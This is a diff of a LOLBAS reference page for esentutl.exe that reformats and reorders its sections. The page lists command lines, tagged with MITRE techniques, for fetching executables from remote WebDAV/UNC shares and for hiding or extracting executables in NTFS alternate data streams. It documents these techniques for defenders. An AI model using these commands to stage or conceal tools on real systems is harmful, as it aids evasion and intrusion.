@@ -28,21 +28,25 @@
     </div>
 </h1>
 
-
 <ul class="function-list">
-    
-    
-    <li><a href="/lolbas/Binaries/Esentutl/#download">Download</a></li>
-    
-    
-    <li><a href="/lolbas/Binaries/Esentutl/#copy">Copy</a></li>
-    
-    
-    <li><a href="/lolbas/Binaries/Esentutl/#ads">Alternate data streams</a></li>
-    
+	
+	
+	
+	<li><a href="/lolbas/Binaries/Esentutl/#copy">Copy</a></li>
+	
+	
+	<li><a href="/lolbas/Binaries/Esentutl/#ads">Alternate data streams</a></li>
+	
+	
+	<li><a href="/lolbas/Binaries/Esentutl/#download">Download</a></li>
+	
 </ul>
 
+	
+
 <p>Binary for working with Microsoft Joint Engine Technology (JET) database</p>
+
+
 
 <br>
 <p><b>Paths:</b> 
@@ -56,148 +60,118 @@
 </p>
 <br>
 <b>Resources:</b> 	
-	<ul style="list-style-type:none">
+<br>
 	
-	<li><a href="https://twitter.com/egre55/status/985994639202283520">https://twitter.com/egre55/status/985994639202283520</a></li>
+	<a href="https://twitter.com/egre55/status/985994639202283520">https://twitter.com/egre55/status/985994639202283520</a>
+	<br>
 	 
-	</ul>
 <br>
 <p><b>Acknowledgement:</b> 
-	<ul style="list-style-type:none">
+<br>
 	
-	<li>egre55 - <a href="https://twitter.com/@egre55">@egre55</a </li>
+	egre55 - <a href="https://twitter.com/@egre55">@egre55</a>
+	<br>
 	 
-	</ul>
 </p>
 <br>
-<p><b>Detection:</b> 
-	<ul style="list-style-type:none">
+<p><b>Detection:</b>
+<br>
 	
-	<li></li>
+	
+	<br>
 	 
-	</ul>
 </p>
 <br>
 <br>
 
 
 
-
-
-
-<h2 id="download" class="function-name">Download</h2>
-
-<p>The LOLBAS can download files.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Copies the source EXE to the destination EXE file</p>
-
-		Usecase:Use to copy files from one unc path to another
-        <pre><code>esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserver\webdav\adrestore.exe /o</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1096">T1096</a></li>
-	<br><br>	
-    
-
-</ul>
-<br><br>
-
-
-
-
-
-<h2 id="copy" class="function-name">Copy</h2>
-
-<p>The LOLBAS can copy file.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Copies the source VBS file to the destination VBS file.</p>
-
+	
+<h2 id="copy" class ="function-name">Copy</h2>
+	
+		Copies the source VBS file to the destination VBS file.
+		<br>
+		<pre><code>esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o</code></pre>
 		Usecase:Copies files from A to B
-        <pre><code>esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a></li>
-	<br><br>	
-    
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
-</ul>
-<br><br>
-
-
-
-
-
-<h2 id="ads" class="function-name">Alternate data streams</h2>
-
-<p>The LOLBAS can write or read alternate data streams.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Copies the source EXE to an Alternate Data Stream (ADS) of the destination file.</p>
-
+	
+<h2 id="ads" class ="function-name">Alternate data streams</h2>
+	
+		Copies the source EXE to an Alternate Data Stream (ADS) of the destination file.
+		<br>
+		<pre><code>esentutl.exe /y C:\ADS\file.exe /d c:\ADS\file.txt:file.exe /o</code></pre>
 		Usecase:Copy file and hide it in an alternate data stream as a defensive counter measure
-        <pre><code>esentutl.exe /y C:\ADS\file.exe /d c:\ADS\file.txt:file.exe /o</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1096">T1096</a></li>
-	<br><br>	
-    
-
-
-
-    <li>
-        <p>Copies the source Alternate Data Stream (ADS) to the destination EXE.</p>
-
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1096">T1096</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Copies the source Alternate Data Stream (ADS) to the destination EXE.
+		<br>
+		<pre><code>esentutl.exe /y C:\ADS\file.txt:file.exe /d c:\ADS\file.exe /o</code></pre>
 		Usecase:Extract hidden file within alternate data streams
-        <pre><code>esentutl.exe /y C:\ADS\file.txt:file.exe /d c:\ADS\file.exe /o</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1096">T1096</a></li>
-	<br><br>	
-    
-
-
-
-    <li>
-        <p>Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file.</p>
-
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1096">T1096</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file.
+		<br>
+		<pre><code>esentutl.exe /y \\192.168.100.100\webdav\file.exe /d c:\ADS\file.txt:file.exe /o</code></pre>
 		Usecase:Copy file and hide it in an alternate data stream as a defensive counter measure
-        <pre><code>esentutl.exe /y \\192.168.100.100\webdav\file.exe /d c:\ADS\file.txt:file.exe /o</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1096">T1096</a></li>
-	<br><br>	
-    
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1096">T1096</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
-</ul>
-<br><br>
+	
+<h2 id="download" class ="function-name">Download</h2>
+	
+		Copies the source EXE to the destination EXE file
+		<br>
+		<pre><code>esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserver\webdav\adrestore.exe /o</code></pre>
+		Usecase:Use to copy files from one unc path to another
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1096">T1096</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
         <script>
          // add permalink on headings
